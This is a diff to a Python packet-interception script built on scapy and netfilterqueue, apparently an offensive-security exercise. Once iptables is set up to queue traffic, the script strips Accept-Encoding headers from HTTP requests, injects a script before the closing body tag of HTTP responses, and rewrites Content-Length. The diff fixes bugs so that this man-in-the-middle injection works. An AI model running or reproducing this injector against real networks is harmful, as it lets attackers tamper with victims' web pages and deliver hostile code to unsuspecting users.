@@ -47,19 +47,26 @@ def process_packet(pkt):
         if sc_pkt.haslayer(sc.Raw):
             load = sc_pkt[sc.Raw].load
             if sc_pkt[sc.TCP].dport == 80:
-                print('[+] HTTP Request')
+                print('[+] HTTP Request\n')
                 load = re.sub("Accept-Encoding:.*?\\r\\n",'',load) #replaces with null string, use our function set_load to modify load 
-                
+                print('Original load: \n')
+                print(sc_pkt[sc.Raw].load)
+                print('Modified load: \n')
+                print(load)
             elif sc_pkt[sc.TCP].sport == 80:
-                print('[+] HTTP Response')
+                print('[+] HTTP Response\nproblem')
                 load = load.replace("</body>",injection_script + "</body>")
-                content_length_search = re.search(r'(?:Content-Length:\s)(\d*)', response_load)
                 
+                content_length_search = re.search(r'(?:Content-Length:\s)(\d*)', load)
                 if content_length_search:
                     content_length = content_length_search.group(1) #returning second group which is the actual content length number
                     new_content_length = int(content_length) + len(injection_script) #adding length of chars in injection string 
-                    response_load = response_load.replace(content_length,new_content_length)
-            
+                    load = load.replace(content_length,str(new_content_length))
+                
+                print('Original load: \n')
+                print(sc_pkt[sc.Raw].load)
+                print('Modified load: \n')
+                print(load)
             if load != sc_pkt[sc.Raw].load:
                 new_sc_pkt = set_load(sc_pkt,load)
                 pkt.set_payload(str(new_sc_pkt))
@@ -71,7 +78,6 @@ def process_packet(pkt):
 
 try:
     iptable_conf()
-    
     print("iptables configured\n\n")
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(1001, process_packet)
